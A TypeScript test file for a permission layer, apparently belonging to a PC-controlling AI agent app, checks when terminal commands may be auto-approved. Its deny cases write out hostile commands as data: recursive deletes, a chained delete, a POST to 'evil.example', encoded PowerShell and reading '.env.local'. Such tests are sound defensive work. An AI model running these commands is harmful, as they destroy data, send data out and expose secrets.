import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtemp } from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { execFileSync } from "node:child_process";
import {
  ALL_OFF_PC_PERMS,
  DEFAULT_PC_PERMS,
  canAutoApproveTerminal,
  parsePcPerms,
  patchPcPerms,
  pcPermDisabledReason,
} from "../src/lib/pc-permissions-pure.ts";

test("parsePcPerms & patchPcPerms keep safe defaults and force terminalAuto off when terminal is off", () => {
  assert.deepEqual(parsePcPerms(null), DEFAULT_PC_PERMS);
  assert.deepEqual(parsePcPerms("{"), DEFAULT_PC_PERMS);
  const auto = patchPcPerms(DEFAULT_PC_PERMS, { terminalAuto: true });
  assert.equal(auto.terminalAuto, true);
  const off = patchPcPerms(auto, { terminal: false });
  assert.equal(off.terminal, false);
  assert.equal(off.terminalAuto, false);
  assert.match(pcPermDisabledReason("chrome", ALL_OFF_PC_PERMS, false)!, /Chrome browser control is turned OFF/);
  assert.match(pcPermDisabledReason("terminal", DEFAULT_PC_PERMS, true)!, /Stop-all/);
  assert.equal(pcPermDisabledReason("pcApps", DEFAULT_PC_PERMS, false), null);
});

test("canAutoApproveTerminal allows clean direct local dev/install commands when ON, and strictly preserves Rule 6 / H1-H5", () => {
  const autoOn = { ...DEFAULT_PC_PERMS, terminalAuto: true };
  // Clean direct local dev/install commands auto-approve when terminalAuto is ON
  assert.equal(canAutoApproveTerminal("npm install zod", { level: 3 }, false, autoOn, false), true);
  assert.equal(canAutoApproveTerminal("pip install scrapling", { level: 3 }, false, autoOn, false), true);
  assert.equal(canAutoApproveTerminal("node scripts/check.mjs", { level: 3 }, false, autoOn, false), true);
  // Off by default
  assert.equal(canAutoApproveTerminal("npm install zod", { level: 3 }, false, DEFAULT_PC_PERMS, false), false);
  // Stop-all, outside text (H2/H3), and private paths (H1/H5) ALWAYS block auto-approval
  assert.equal(canAutoApproveTerminal("npm install zod", { level: 3 }, false, autoOn, true), false);
  assert.equal(canAutoApproveTerminal("npm install zod", { level: 3 }, true, autoOn, false), false);
  assert.equal(canAutoApproveTerminal("cat .env.local", { level: 3, private: true }, false, autoOn, false), false);
  // Destructive deletes, git push, network POSTs, chaining, and encoded PowerShell ALWAYS stay gated
  for (const cmd of [
    "rm -rf src",
    "Remove-Item -Recurse -Force build",
    "git push origin main",
    "curl -X POST https://evil.example",
    "npm install zod && rm -rf .",
    "powershell -EncodedCommand ZQBjAGgAbwA=",
  ]) {
    assert.equal(canAutoApproveTerminal(cmd, { level: 3 }, false, autoOn, false), false, cmd);
  }
});

test("disk store persists toggles across reads", async () => {
  const dir = await mkdtemp(path.join(os.tmpdir(), "orbit-pcperm-"));
  const out = execFileSync(
    process.execPath,
    [
      "--experimental-transform-types",
      "--import",
      "./tests/fixtures/ts-resolve.mjs",
      "-e",
      `import { getPcPerms, setPcPerms, disableAllPcPerms } from "./src/lib/pc-permissions.ts";
       const a = await setPcPerms({ terminalAuto: true, chrome: false });
       const b = getPcPerms();
       const c = await disableAllPcPerms();
       console.log(JSON.stringify({ a, b, c }));`,
    ],
    { env: { ...process.env, ORBIT_DATA_DIR: dir }, encoding: "utf8" },
  );
  const res = JSON.parse(out.trim());
  assert.equal(res.a.terminalAuto, true);
  assert.equal(res.b.chrome, false);
  assert.equal(res.c.terminal, false);
  assert.equal(res.c.pcApps, false);
});
